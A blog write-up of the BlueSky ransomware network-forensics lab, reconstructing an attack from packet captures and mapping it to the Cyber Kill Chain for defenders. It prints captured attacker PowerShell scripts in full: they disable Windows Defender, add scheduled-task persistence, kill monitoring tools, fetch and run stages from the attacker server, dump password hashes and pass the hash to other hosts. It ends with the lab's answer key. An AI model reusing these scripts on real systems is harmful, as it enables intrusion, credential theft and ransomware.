---
title: "BlueSky Ransomware Writeup"
date: 2025-09-28 8:40:00 +0300
categories: [Network Forensics]
tags: [lab , network-forensics, malware-analysis]
---

---

## Scenario

A high-profile corporation that manages critical data and services across diverse industries has reported a significant security incident. Recently their network has been impacted by a suspected ransomware attack. Key files have been encrypted causing disruptions and raising concerns about potential data compromise. Early signs point to the involvement of a sophisticated threat actor. Your task is to analyze the evidence provided to uncover the attacker’s methods assess the extent of the breach and aid in containing the threat to restore the network’s integrity.

---

## important note - Investigation Approach

I will began the investigation by opening the provided capture and evidence files directly to get an initial impression of the data set. My first priority was to observe overall network activity to identify suspicious flows and timelines that would guide deeper analysis. For packet level analysis I used Wireshark to inspect protocols sessions and extract artifacts . To recover hosts files and carved artifacts from the capture I used Network Miner which helped surface extracted files credentials and host metadata quickly. In parallel I examined the supplied log file to correlate host events with network activity and to establish a timeline. Throughout the investigation I documented each finding and mapped observable actions to the relevant stage in the Cyber Kill Chain to show how the attack evolved from reconnaissance through to potential impact. After completing the forensic analysis I will answer the  questions using only evidence-derived results.

---

## Investigation part 
I began by opening the capture in Wireshark and taking an initial look at the overall statistics.
Using the Statistics → Conversations and Statistics → Endpoints views I reviewed which hosts were communicating the direction of traffic and the total amount of data exchanged.
This first pass provided a clear picture of who was talking to whom and the relative volume of each conversation helping to highlight the most active or potentially suspicious hosts before moving into deeper packet level analysis.
---
One of the first notable observations from the Wireshark statistics is a highly asymmetric conversation between **87.96.21.81** and **87.96.21.84** where **87.96.21.81** is the predominant sender.
Using Statistics → Conversations I found that 87.96.21.81 transmitted approximately 4750 packets to 87.96.21.84 making this flow one of the most active in the capture and therefore a prime candidate for further investigation.

![PCAP Evidence](assets/lib/BlueSky/1.jpg)

In addition to the heavy packet volume I also observed a significant number of TCP connections between the same two hosts.
While high connection counts alone are not necessarily suspicious the pattern of activity raised concern when I examined the destination ports.
The host **87.96.21.84** was systematically attempting connections across an extensive port range starting at 1 and continuing up to 65389.
This sequential probing of nearly the entire TCP port space is a strong indicator of an active port scanning operation targeting the system at **87.96.21.81**.

Within the framework of the Cyber Kill Chain this behavior clearly fits the **Reconnaissance** stage and more specifically represents **Active Reconnaissance** where the attacker directly interacts with the target network to identify open services and potential vulnerabilities before moving on to weaponization or exploitation.

![PCAP Evidence](assets/lib/BlueSky/2.jpg)

After completing the scan the attacker confirmed that several ports were open on the target system
The identified open ports were

![PCAP Evidence](assets/lib/BlueSky/3.jpg)

```
445: SMB
139: NetBIOS
135: Microsoft RPC
5357: WS-Discovery
1433: Microsoft SQL Server
```
After the scan the attacker focused on the Microsoft SQL Server service as the primary target
This activity was first observed in packet 2239 where the attacker attempted to access the administrator account and the compromise was successful in packet 2641

![PCAP Evidence](assets/lib/BlueSky/4.jpg)

now we can observe the following changes clearly visible in NetworkMiner

The SQL Server RECONFIGURE command was executed to apply the new configuration settings
The xp_cmdshell option was enabled changing its value from 0 to 1 allowing execution of operating system commands through SQL Server
The show advanced options setting was turned on changing from 0 to 1 to permit modification of advanced server features

We can also see the attacker started using
```
EXEC master..xp_cmdshell
``` 
and he started to upload some payloads by echo command  

![PCAP Evidence](assets/lib/BlueSky/5.jpg)


The last two **EXEC master..xp_cmdshell** commands write a VBScript file **%TEMP%\Gjmwb.vbs** line by line using echo then execute it with **cscript //nologo** so it runs quietly without the Windows Script Host banner.
The VBScript implements a Base64 decoder that reconstructs binary data and writes the decoded output to **%TEMP%\LkUYP.exe** then launches that executable via **Wscript.Shell** so the payload runs silently on the server.
In short the attacker used **xp_cmdshell** as a dropper channel to decode a Base64 payload to disk and execute it resulting in remote code execution on the SQL Server host.

The attacker added the executable file to the temp directory and renamed it to Gjmwb.vbs which is a reverse shell and then got a  initial access .

![PCAP Evidence](assets/lib/BlueSky/6.jpg)

the attacker escalated privileges by injecting a payload into **winlogon.exe** using Metasploit (msfconsole).
Windows Event ID **400** in the logs corresponds to the creation of a new PowerShell host process and corroborates post exploitation activity.

![PCAP Evidence](assets/lib/BlueSky/7.jpg)

After obtaining administrative privileges on the victim machine the attacker began uploading additional files to the system to expand control and persist access

![PCAP Evidence](assets/lib/BlueSky/8.jpg)

``` 
GET /checking.ps1 HTTP/1.1
Host: 87.96.21.84
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.8
Date: Sun 28 Apr 2024 00:32:10 GMT
Content-type: application/octet-stream
Content-Length: 5024
Last-Modified: Sat 27 Apr 2024 23:16:35 GMT

$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
$osver = ([environment]::OSVersion.Version).Major

$WarningPreference = "SilentlyContinue"
$ErrorActionPreference = "SilentlyContinue"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

$url = "http://87.96.21.84"

Function Test-URL {
    param (
        [string]$url
    )
    
    try {
        $request = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        if ($request.StatusCode -eq 200) {
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}

Function Test-ScriptURL {
    param (
        [string]$scriptUrl
    )
    
    try {
        $request = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -TimeoutSec 5 -ErrorAction Stop
        if ($request.StatusCode -eq 200) {
            return $true
        } else {
            return $false
        }
    } catch {
        return $false
    }
}

Function StopAV {

    if ($osver -eq "10") {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    }
    Function Disable-WindowsDefender {

        if ($osver -eq "10") {

            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionPath "C:\ProgramData\Oracle" -ErrorAction SilentlyContinue
    

            Set-MpPreference -ExclusionPath "C:\ProgramData\Oracle\Java" -ErrorAction SilentlyContinue
            Set-MpPreference -ExclusionPath "C:\Windows" -ErrorAction SilentlyContinue
    

            $defenderRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender"
            $defenderRegistryKeys = @(
                "DisableAntiSpyware"
                "DisableRoutinelyTakingAction"
                "DisableRealtimeMonitoring"
                "SubmitSamplesConsent"
                "SpynetReporting"
            )
    

            if (-not (Test-Path $defenderRegistryPath)) {
                New-Item -Path $defenderRegistryPath -Force | Out-Null
            }
    

            foreach ($key in $defenderRegistryKeys) {
                Set-ItemProperty -Path $defenderRegistryPath -Name $key -Value 1 -ErrorAction SilentlyContinue
            }
    

            Get-Service WinDefend | Stop-Service -Force -ErrorAction SilentlyContinue
            Set-Service WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
        }
    }
    

    $servicesToStop = "MBAMService" "MBAMProtection" "*Sophos*"
    foreach ($service in $servicesToStop) {
        Get-Service | Where-Object { $_.DisplayName -like $service } | ForEach-Object {
            Stop-Service $_ -ErrorAction SilentlyContinue
            Set-Service $_ -StartupType Disabled -ErrorAction SilentlyContinue
        }
    }
}


Function CleanerEtc {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1" "C:\ProgramData\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
}


Function CleanerNoPriv {
    $WebClient = New-Object System.Net.WebClient
    $WebClient.DownloadFile("http://87.96.21.84/del.ps1" "C:\Users\del.ps1") | Out-Null
    C:\Windows\System32\schtasks.exe /create /tn "Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237" /sc HOURLY /f /mo 3 /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass C:\Users\del.ps1" | Out-Null
}

$scriptUrl = "http://87.96.21.84/del.ps1"

if (Test-URL -url $url) {
    Write-Host "Connection to $url successful. Proceeding with execution."
    

    if (Test-ScriptURL -scriptUrl $scriptUrl) {
        Write-Host "Script at $scriptUrl is reachable."

        if ($priv) {
            CleanerEtc

            $encodedDiscovery = "SW52b2tlLUV4cHJlc3Npb24gIndob2FtaSI="
            $decodedDiscovery = [System.Convert]::FromBase64String($encodedDiscovery)
            $commandDiscovery = [System.Text.Encoding]::UTF8.GetString($decodedDiscovery)
            powershell -exec bypass -w 1 $commandDiscovery

            Write-Host "Privilege level: SYSTEM"

        } else {
            CleanerNoPriv
            Write-Host "Privilege level: User"
        }
    } else {
        Write-Host "Script at $scriptUrl is not reachable. Terminating."
        exit
    }
} else {
    Write-Host "Connection to $url failed. Terminating."
    exit
}

if ($priv -eq $true) {
    try {
        StopAV
    } catch {}
    Start-Sleep -Seconds 1
    CleanerEtc
} else {
    CleanerNoPriv
}
``` 
**What the script is and what it does ?**

This is a downloader / installer PowerShell script hosted on http://87.96.21.84 (served as checking.ps1)
It checks whether it can reach the attacker server and whether an additional script del.ps1 is available
It detects the current privilege level (checks if the process is in the Administrators group) and branches behavior for privileged vs non privileged contexts
If running with elevated privileges it attempts to disable or weaken Windows Defender and other AV services and writes removal/exclusion registry keys
It downloads and stages persistent tasks and pulls and executes another stage ichigo-lite.ps1 from the same server
It creates scheduled tasks to repeatedly run a cleanup/runner script (del.ps1) either under SYSTEM or the current user depending on privileges
It contains a Base64 encoded command which it decodes and executes (used for discovery or additional commands)
Overall the script is intended to persist disable defenses download additional payloads and execute them silently
How it downloads and executes additional files (step by step high level)
The script tests reachability to the command server URL http://87.96.21.84 and checks that http://87.96.21.84/del.ps1 exists
If reachable it downloads del.ps1 to a local path (C:\ProgramData\del.ps1 when privileged or C:\Users\del.ps1 otherwise) using a WebClient call
It creates a scheduled task that runs the downloaded del.ps1 regularly so the attacker gains persistence
It invokes Invoke-Expression on code fetched from http://87.96.21.84/ichigo-lite.ps1 to pull and run the next-stage script in memory
It decodes and runs a Base64 encoded PowerShell command (decoded via [System.Convert]::FromBase64String) which performs further discovery or actions
If elevated it also attempts to stop AV services and set Defender registry flags and exclusions before continuing

---
i found this :
**Invoke-Expression "whoami"** runs the string whoami as a PowerShell command and returns the account the process is running under (COMPUTER Administrator)
Attackers use this to check privilege level before performing privileged actions

![PCAP Evidence](assets/lib/BlueSky/9.jpg)

---

**what del.ps1 do ?**

``` 
Get-WmiObject _FilterToConsumerBinding -Namespace root\subscription | Remove-WmiObject

$list = "taskmgr" "perfmon" "SystemExplorer" "taskman" "ProcessHacker" "procexp64" "procexp" "Procmon" "Daphne"
foreach($task in $list)
{
    try {
        stop-process -name $task -Force
    }
    catch {}
}

stop-process $pid -Force
``` 
This script is the del.ps1 stage that the downloader retrieves and runs after the initial script
In short it does three things
Removes WMI event consumer bindings (Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Remove-WmiObject) which disables or removes certain WMI based persistence or event consumers
Attempts to terminate common monitoring and forensic tools by name (taskmgr perfmon SystemExplorer taskman ProcessHacker procexp64 procexp Procmon Daphne) to hinder analysis and detection
Forces the script to kill its own process (stop-process $pid -Force) to exit cleanly after performing its actions

---

**what ichigo-lite.ps1 do ?**
``` 
GET /ichigo-lite.ps1 HTTP/1.1
Host: 87.96.21.84
Connection: Keep-Alive

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.8
Date: Sun 28 Apr 2024 00:32:12 GMT
Content-type: application/octet-stream
Content-Length: 2559
Last-Modified: Sun 28 Apr 2024 00:29:39 GMT

Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-PowerDump.ps1')
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/Invoke-SMBExec.ps1')

$hostsContent = Invoke-WebRequest -Uri "http://87.96.21.84/extracted_hosts.txt" | Select-Object -ExpandProperty Content -ErrorAction Stop

$EncodedCommand = "KE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vODcuOTYuMjEuODQvSW52b2tlLVBvd2VyRHVtcC5wczEnKSB8IEludm9rZS1FeHByZXNzaW9uDQoNCg=="
Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedCommand)))


$EncodedExec = "SW52b2tlLVBvd2VyRHVtcCB8IE91dC1GaWxlIC1GaWxlUGF0aCAiQzpcUHJvZ3JhbURhdGFcaGFzaGVzLnR4dCI="
Invoke-Expression -Command ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedExec)))


$usernames = @()
$passwordHashes = @()
$hashesContent = Get-Content -Path "C:\ProgramData\hashes.txt" -ErrorAction SilentlyContinue

if ($hashesContent) {
    foreach ($line in $hashesContent) {
        $pattern =  "^(.*?):\d+:(.*?):(.*?):.*?:"

        if ($line -match $pattern) {
            $username = $matches[1].Trim()
            $passwordHash = $matches[3].Trim()
            $usernames += $username
            $passwordHashes += $passwordHash
        }
    }
}

if ($usernames.Count -gt 0 -and $passwordHashes.Count -gt 0) {
    if ($hostsContent) {
        foreach ($targetHost in $hostsContent -split "`n") {
            if (![string]::IsNullOrWhiteSpace($targetHost)) {
                $username = $usernames[0]
                $password = $passwordHashes[0]
                Invoke-SMBExec -Target $targetHost -Username $username -Hash $password
            }
        }
    } 
}
    
Function Download-FileFromURL {
    param (
        [string]$url
        [string]$destinationPath
    )

    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url $destinationPath)
        Write-Host "File downloaded from $url to $destinationPath"
        return $true
    } catch {
        Write-Host "Error downloading file from $url"
        return $false
    }
}

$blueUri = "http://87.96.21.84/javaw.exe"
$downloadDestination = "C:\ProgramData\javaw.exe"

$downloadSuccess = Download-FileFromURL -url $blueUri -destinationPath $downloadDestination

if ($downloadSuccess) {
    # Start-Process -FilePath $downloadDestination -ArgumentList "/silent" -NoNewWindow -Wait
}
``` 

it downloads and runs two post exploit modules from the attacker server namely Invoke-PowerDump.ps1 and Invoke-SMBExec.ps1
Fetches extracted_hosts.txt from the server which lists target hosts for lateral movement
Decodes and executes embedded Base64 commands that invoke Invoke-PowerDump and run its output to file (further credential dumping)
Reads C:\ProgramData\hashes.txt extracts usernames and NTLM password hashes and stores them in arrays
For each host in extracted_hosts.txt it attempts lateral access using Invoke-SMBExec with the extracted username and hash (pass the hash style authentication)
Provides a helper Download-FileFromURL function and downloads http://87.96.21.84/javaw.exe to C:\ProgramData\javaw.exe (ready to be executed)

---
**what Invoke-PowerDump.ps1 do ?**

![PCAP Evidence](assets/lib/BlueSky/10.jpg)

Invoke-PowerDump is a post exploitation PowerShell function that dumps local Windows account hashes (SAM/SYSTEM) for credential harvesting.
It requires administrative rights and commonly escalates to SYSTEM (token duplication) to access the registry hives.
The module generates and runs an encoded/compressed PowerShell command to extract NTLM hashes from the registry.
Indicators include long / encoded PowerShell commands unusual reads of HKLM\SAM and HKLM\SYSTEM and spawning processes with elevated tokens.
Mitigations include restricting admin access enabling PowerShell logging and ScriptBlock audit monitoring for encoded commands and isolating and forensically collecting any affected hosts.

---

after that he extracted the devices in the network in this file **extracted_hosts.txt**

![PCAP Evidence](assets/lib/BlueSky/11.jpg)

---
now lets extract the exe from the pcap and send it to VT >>

![PCAP Evidence](assets/lib/BlueSky/12.jpg)

i will leave the link so u can Investigate too ><

``` 
https://www.virustotal.com/gui/file/3e035f2d7d30869ce53171ef5a0f761bfb9c14d94d9fe6da385e20b8d96dc2fb/details
``` 
---

Below is a complete, detail‑by‑detail mapping of everything we uncovered into the Cyber Kill Chain stages (Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives). I included concrete evidence, artifacts, commands, packet numbers, filenames, registry keys, scheduled task names, network indicators and suggested detections next to each step so nothing gets missed.

---

## Cyber Kill Chain mapping ##

### 1) Reconnaissance (Active)

Evidence / Actions observed

* Source IP performing active probing and scanning: **87.96.21.84**.
* High volume asymmetric conversation where `87.96.21.81` received ≈ **4,750 packets** from `87.96.21.84` (Wireshark Conversations view).
* Systematic TCP probing from `87.96.21.84` across ports **1 → 65,389** indicating full TCP port sweep (active port scan).
* Packet evidence: scan activity and selection of targets visible around **packet 2239** (attacker begins targeted access attempts).

Open ports discovered by the attacker (scan results)

* **445** — SMB
* **139** — NetBIOS
* **135** — Microsoft RPC
* **5357** — WS-Discovery
* **1433** — Microsoft SQL Server

Why this maps to Reconnaissance

* Sequential port probes and large TCP connection counts = Active Recon used to discover services to attack (SMB, MSSQL, RPC, etc.)

Detect / log artifacts to hunt for

* IDS/Netflow: many small TCP SYNs from a single external IP across many destination ports
* Host logs: failed connection attempts and service scan patterns
* Wireshark evidence: sequential destination ports from 87.96.21.84

---

### 2) Weaponization

Evidence / Actions observed

* Preparation of exploit artifacts and payloads on the attacker server `87.96.21.84` (served files):

  * `/checking.ps1` (downloaded as `http://87.96.21.84/checking.ps1`)
  * `/del.ps1` (downloaded as `http://87.96.21.84/del.ps1`)
  * `/ichigo-lite.ps1`, `/Invoke-PowerDump.ps1`, `/Invoke-SMBExec.ps1`
  * `javaw.exe` staged at `http://87.96.21.84/javaw.exe` (downloaded to `C:\ProgramData\javaw.exe`)
* Ransomware sample identified (SHA256 `3e035f2...c2fb`) classified as **BlueSky** with behavior: AES+RSA encryption, `.bluesky` extension, ransom note `# DECRYPT FILES BLUESKY #`. (Malware repo / VT findings)

Why this maps to Weaponization

* Attacker built and hosted multiple scripts and binary payloads that will be delivered/executed once access is gained (payload staging + credential dumping / lateral tooling + ransomware).

Detect / log artifacts to hunt for

* Web server logs on attacker IP (file hosting)
* Outbound HTTP requests from hosts to `87.96.21.84` for `/checking.ps1`, `/del.ps1`, `/ichigo-lite.ps1`, `/javaw.exe`

---

### 3) Delivery

Evidence / Actions observed

* Initial interaction and delivery channels seen in PCAP: HTTP GET requests from victim(s) to attacker host `87.96.21.84` requesting `checking.ps1`, `del.ps1`, `ichigo-lite.ps1`, etc.

  * Example HTTP GET `GET /checking.ps1 HTTP/1.1` and response `HTTP/1.0 200 OK` (SimpleHTTP server) with Content-Length and payload.
* Use of SQL injection / direct SQL over network? (Attacker targeted SQL Server service on 1433; subsequent SQL commands executed via SQL session.)
* Use of `xp_cmdshell` as an execution/delivery channel for dropping payloads.

Why this maps to Delivery

* Scripts and binaries are fetched over HTTP and delivered to the victim machine (downloader stage). `xp_cmdshell` was used to write and execute scripts directly from SQL Server context.

Detect / log artifacts to hunt for

* HTTP requests to `87.96.21.84`
* SQL Server network sessions from remote IPs or unusual SQL commands over port 1433
* Web server host headers and user agents in the GET requests

---

### 4) Exploitation

Evidence / Actions observed

* Targeted account: **`sa`** (SQL admin account) identified as the account attacker targeted (Q2).
* Password discovered / used by attacker: **`cyb3rd3f3nd3r$`** (Q3) — attacker authenticated successfully. Evidence: successful login observed in PCAP / packet timeline (attack initiation packet **2239**, successful compromise packet **2641**).
* Commands executed in SQL context to change configuration:

  * `sp_configure 'show advanced options', 1` (changed 0 → 1)
  * `sp_configure 'xp_cmdshell', 1` (enabled xp_cmdshell 0 → 1)
  * `RECONFIGURE` to apply changes

Why this maps to Exploitation

* Successful use of credentials to access privileged account (SA) and enable features to execute OS commands (xp_cmdshell) is classic exploitation of SQL service.

Detect / log artifacts to hunt for

* SQL Server login success for `sa` from unusual source IP
* Execution of `sp_configure` and `RECONFIGURE` in SQL logs
* Enabling of `xp_cmdshell` recorded in SQL audit logs

---

### 5) Installation (Persistence / Lateral tooling staging)

Evidence / Actions observed

* Use of `xp_cmdshell` to write a VBScript to `%TEMP%\Gjmwb.vbs` and then run it with `cscript //nologo`

  * VBScript decodes Base64 and writes `%TEMP%\LkUYP.exe` then executes it (silent execution).
* `del.ps1` downloaded and written to `C:\ProgramData\del.ps1` or `C:\Users\del.ps1` depending on privileges.
* Scheduled tasks created for persistence:

  * `\Microsoft\Windows\MUI\LPupdate` created with SYSTEM run context to execute `C:\ProgramData\del.ps1` hourly
  * Alternative scheduled task for non-privileged case: `Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237` (user-level scheduled task)
* Files dropped/staged locally: `%TEMP%\Gjmwb.vbs`, `%TEMP%\LkUYP.exe`, `C:\ProgramData\javaw.exe`, `C:\ProgramData\del.ps1`, `C:\Users\del.ps1`, `C:\ProgramData\hashes.txt` (credential dump output)
* Disabling or removing WMI consumer persistence: `Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Remove-WmiObject` executed by `del.ps1`
* Removal/disable of monitoring tools: script stops processes by name (taskmgr, perfmon, ProcessHacker, procexp, Procmon, Daphne)

Why this maps to Installation

* Scripted file drops, scheduled task creation and WMI persistence removal are actions that establish persistence and prepare the host for continued attacker control and payload execution.

Detect / log artifacts to hunt for

* Creation of scheduled tasks with suspicious names or run contexts
* New files in `C:\ProgramData` and `%TEMP%` with odd names (`javaw.exe`, `LkUYP.exe`, `Gjmwb.vbs`)
* WMI filter/consumer removals and `Remove-WmiObject` activity in PowerShell logs
* Process termination attempts for forensic/monitoring tools

---

### 6) Command & Control (C2)

Evidence / Actions observed

* C2 / attacker server: **87.96.21.84**
* Ongoing HTTP GETs to pull scripts and binaries: `/checking.ps1`, `/del.ps1`, `/ichigo-lite.ps1`, `/Invoke-PowerDump.ps1`, `/Invoke-SMBExec.ps1`, `/javaw.exe`
* Execution in memory of modules: `Invoke-PowerDump` and `Invoke-SMBExec` invoked via `Invoke-Expression (New-Object System.Net.WebClient).DownloadString(...)` — in‑memory module execution to avoid disk artifacts.
* Event evidence: Windows Event **ID 400** indicates new PowerShell host process start correlating with post‑exploit activity and module execution.
* Use of `xp_cmdshell` and `cscript` to run staged components, and PowerShell `Invoke-Expression` to fetch/execute code from the attacker host.

Why this maps to C2

* Persistent communication to attacker server to fetch commands and modules, plus in-memory execution, are classic C2 and remote control mechanisms.

Detect / log artifacts to hunt for

* Repeated HTTP requests to same external IP (87.96.21.84) for multiple script names
* PowerShell download and execute patterns (`Invoke-Expression` with remote URL), event 400 (PowerShell host start), Windows Script Host executions (`cscript`)
* Network checkpoints: blocklist or inspect traffic to the known C2 IP and file paths

---

### 7) Actions on Objectives (Credential access, Lateral Movement, Impact / Ransomware)

Evidence / Actions observed

* Credential access / Dumping

* `Invoke-PowerDump` run to extract credentials from registry (SAM/SYSTEM) and output to `C:\ProgramData\hashes.txt`. (Q12, Q13)
* `hashes.txt` parsed to extract usernames and NTLM hashes in the script (username/passwordHash arrays).
* Indicator of pass the hash tooling: `Invoke-SMBExec` used with `-Username` and `-Hash` to attempt lateral authentication to hosts listed in `extracted_hosts.txt` (Q14).
* `extracted_hosts.txt` served by attacker listing targets for lateral movement.

* Lateral movement

* For each host in `extracted_hosts.txt`, attacker invoked `Invoke-SMBExec -Target <host> -Username <user> -Hash <hash>` thereby performing pass-the-hash lateral execution.

* Privilege escalation & process injection

* Process injection into `winlogon.exe` recorded (attacker used Metasploit `msfconsole` to inject C2 into `winlogon.exe`) to escalate/preserve SYSTEM-level control. (Q5)
* `Invoke-Expression "whoami"` and group SID check `S-1-5-32-544` (Administrators group) used to confirm privilege level. (Q7)

* Disabling defenses / cleanup

* Defender disabling registry keys set:

  * `DisableAntiSpyware`
  * `DisableRoutinelyTakingAction`
  * `DisableRealtimeMonitoring`
  * `SubmitSamplesConsent`
  * `SpynetReporting`
    (set to 1 by script) — (Q8)
* Attempts to stop Defender service `WinDefend` and other AV services (MBAMService, MBAMProtection, *Sophos*) and create Defender exclusions (C:\ProgramData\Oracle, C:\Windows).
* `del.ps1` removed WMI bindings and killed monitoring tools to hinder detection.

* Persistence and scheduling

* Scheduled task `\Microsoft\Windows\MUI\LPupdate` created to run `C:\ProgramData\del.ps1` as SYSTEM hourly (persistence). (Q10)
* Non-privileged scheduled task alternative created for user-level persistence.

* Impact / Ransomware deployment

* Final stage: ransomware sample (BlueSky) deployed and executed across network using SMB lateral movement and previously harvested credentials. Ransom note name: `# DECRYPT FILES BLUESKY #` and family: **BlueSky** (Q15, Q16).
* Files staged such as `C:\ProgramData\javaw.exe` and `LkUYP.exe` indicate payload binaries ready for execution and likely encryption stage.

Why this maps to Actions on Objectives

* The attacker harvested credentials, moved laterally, escalated privileges, disabled defenses, established persistence and finally deployed ransomware to achieve impact (encryption and ransom).

Detect / log artifacts to hunt for

* `hashes.txt`, `extracted_hosts.txt`, scheduled task creation logs, SMBExec command executions, Process injection indicators into `winlogon.exe`, new `javaw.exe`/`LkUYP.exe` executables, creation of ransom note `# DECRYPT FILES BLUESKY #`, outbound connections to 87.96.21.84 during staging and encryption phases.

---

## Full list of concrete IOCs and artifacts (single place)

* Attacker C2 IP: **87.96.21.84**
* HTTP paths: `/checking.ps1`, `/del.ps1`, `/ichigo-lite.ps1`, `/Invoke-PowerDump.ps1`, `/Invoke-SMBExec.ps1`, `/javaw.exe`, `/extracted_hosts.txt`
* Downloaded local files: `C:\ProgramData\del.ps1`, `C:\Users\del.ps1`, `C:\ProgramData\javaw.exe`, `%TEMP%\Gjmwb.vbs`, `%TEMP%\LkUYP.exe`, `C:\ProgramData\hashes.txt`
* Scheduled task names: `\Microsoft\Windows\MUI\LPupdate` and user task `Optimize Start Menu Cache Files-S-3-5-21-2236678155-433529325-1142214968-1237`
* SQL changes: `show advanced options = 1`, `xp_cmdshell = 1`, `RECONFIGURE`
* SQL targeted account: **sa** and password **cyb3rd3f3nd3r$**
* Group SID checked: **S-1-5-32-544**
* Defender registry keys: `DisableAntiSpyware`, `DisableRoutinelyTakingAction`, `DisableRealtimeMonitoring`, `SubmitSamplesConsent`, `SpynetReporting`
* Process injected: **winlogon.exe**
* PowerShell event: **Windows Event ID 400** (new PowerShell host started)
* Ransomware family and sample: **BlueSky**; ransom note `# DECRYPT FILES BLUESKY #`; sample SHA256 `3e035f2d7d30869c...d96dc2fb`
* Scripts used: `checking.ps1`, `del.ps1`, `ichigo-lite.ps1`, `Invoke-PowerDump.ps1`, `Invoke-SMBExec.ps1`
* Commands used to drop payload: `EXEC master..xp_cmdshell 'echo ... > %TEMP%\Gjmwb.vbs'` and `cscript //nologo %TEMP%\Gjmwb.vbs`
* Base64 encoded commands decoded and executed via PowerShell (`[Convert]::FromBase64String(...)` → `Invoke-Expression`)

---

---
## questions of the lab

* Q1 ) Knowing the source IP of the attack allows security teams to respond to potential threats quickly. Can you identify the source IP responsible for potential port scanning activity?
```
Answer: 87.96.21.84
```
* Q2 ) During the investigation, it's essential to determine the account targeted by the attacker. Can you identify the targeted account username?
```
Answer: sa
```
* Q3 )We need to determine if the attacker succeeded in gaining access. Can you provide the correct password discovered by the attacker?
```
Answer: cyb3rd3f3nd3r$
```
* Q4) Attackers often change some settings to facilitate lateral movement within a network. What setting did the attacker enable to control the target host further and execute further commands?
```
Answer: xp_cmdshell
```
* Q5) Process injection is often used by attackers to escalate privileges within a system. What process did the attacker inject the C2 into to gain administrative privileges?
```
Answer: winlogon.exe
```
* Q6 )Following privilege escalation, the attacker attempted to download a file. Can you identify the URL of this file downloaded?
```
Answer: http://87.96.21.84/checking.ps1
```
* Q7 ) Understanding which group Security Identifier (SID) the malicious script checks to verify the current user's privileges can provide insights into the attacker's intentions. Can you provide the specific Group SID that is being checked?
```
Answer: S-1-5-32-544
```
* Q8 ) Windows Defender plays a critical role in defending against cyber threats. If an attacker disables it, the system becomes more vulnerable to further attacks. What are the registry keys used by the attacker to disable Windows Defender functionalities? Provide them in the same order found.
```
Answer: DisableAntiSpyware, DisableRoutinelyTakingAction, DisableRealtimeMonitoring, SubmitSamplesConsent, SpynetReporting
```
* Q9 ) Can you determine the URL of the second file downloaded by the attacker?
```
Answer: http://87.96.21.84/del.ps1
```
* Q10 ) Identifying malicious tasks and understanding how they were used for persistence helps in fortifying defenses against future attacks. What's the full name of the task created by the attacker to maintain persistence?
```
Answer: \Microsoft\Windows\MUI\LPupdate
```
* Q11 ) Based on your analysis of the second malicious file, What is the MITRE ID of the main tactic the second file tries to accomplish?
```
Answer: TA0005
```
* Q12 ) What's the invoked PowerShell script used by the attacker for dumping credentials?
```
Answer: Invoke-PowerDump.ps1
```
* Q13 ) Understanding which credentials have been compromised is essential for assessing the extent of the data breach. What's the name of the saved text file containing the dumped credentials?
```
Answer: hashes.txt
```
* Q14 ) Knowing the hosts targeted during the attacker's reconnaissance phase, the security team can prioritize their remediation efforts on these specific hosts. What's the name of the text file containing the discovered hosts?
```
Answer: extracted_hosts.txt
```
* Q15 )After hash dumping, the attacker attempted to deploy ransomware on the compromised host, spreading it to the rest of the network through previous lateral movement activities using SMB. You’re provided with the ransomware sample for further analysis. By performing behavioral analysis, what’s the name of the ransom note file?
```
Answer: # DECRYPT FILES BLUESKY #
```
 Q16 )In some cases, decryption tools are available for specific ransomware families. Identifying the family name can lead to a potential decryption solution. What's the name of this ransomware family?
```
Answer: BlueSky
```

## Lab Link :
```
https://cyberdefenders.org/blueteam-ctf-challenges/bluesky-ransomware/
```
---